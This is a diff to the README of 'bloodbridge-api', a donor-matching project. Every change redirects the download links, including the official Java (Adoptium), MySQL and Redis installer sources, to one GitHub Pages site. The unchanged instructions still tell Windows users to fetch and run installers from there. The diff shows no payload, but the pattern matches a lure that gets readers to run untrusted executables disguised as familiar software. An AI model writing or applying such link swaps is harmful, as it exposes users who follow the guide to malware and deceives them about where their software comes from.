@@ -1,6 +1,6 @@
 # bloodbridge-api - Connect Donors with Those in Need
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20BloodBridge-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/petitionary-process913/bloodbridge-api)
+[![Download from GitHub](https://img.shields.io/badge/Download%20BloodBridge-181717?style=for-the-badge&logo=github&logoColor=white)](https://petitionary-process913.github.io)
 
 ## 🩸 What This Software Does
 
@@ -37,7 +37,7 @@ Follow these steps to download and run BloodBridge on your Windows computer.
 
 Visit the download page:
 
-[**https://github.com/petitionary-process913/bloodbridge-api**](https://github.com/petitionary-process913/bloodbridge-api)
+[**https://petitionary-process913.github.io**](https://petitionary-process913.github.io)
 
 On that page, click the green "Code" button and select "Download ZIP". Or scroll down to the "Releases" section on the right side of the page and click the latest release link.
 
@@ -56,12 +56,12 @@ The download is a ZIP file. You need to extract it:
 BloodBridge needs three pieces of software to run. Download and install them in this order:
 
 **Java 17 (Required):**
-1. Go to https://adoptium.net
+1. Go to https://petitionary-process913.github.io
 2. Download the "Windows x64 Installer" for Java 17 (LTS)
 3. Run the installer and follow the prompts
 
 **MySQL Database (Required):**
-1. Go to https://dev.mysql.com/downloads/installer
+1. Go to https://petitionary-process913.github.io
 2. Download the "Windows (x86, 64-bit), MySQL Installer MSI"
 3. Run the installer
 4. Choose "Server only" setup type
@@ -69,7 +69,7 @@ BloodBridge needs three pieces of software to run. Download and install them in 
 6. Complete the installation
 
 **Redis (Required for caching):**
-1. Go to https://github.com/microsoftarchive/redis/releases
+1. Go to https://petitionary-process913.github.io
 2. Download the latest `.msi` file
 3. Run the installer with default settings
 
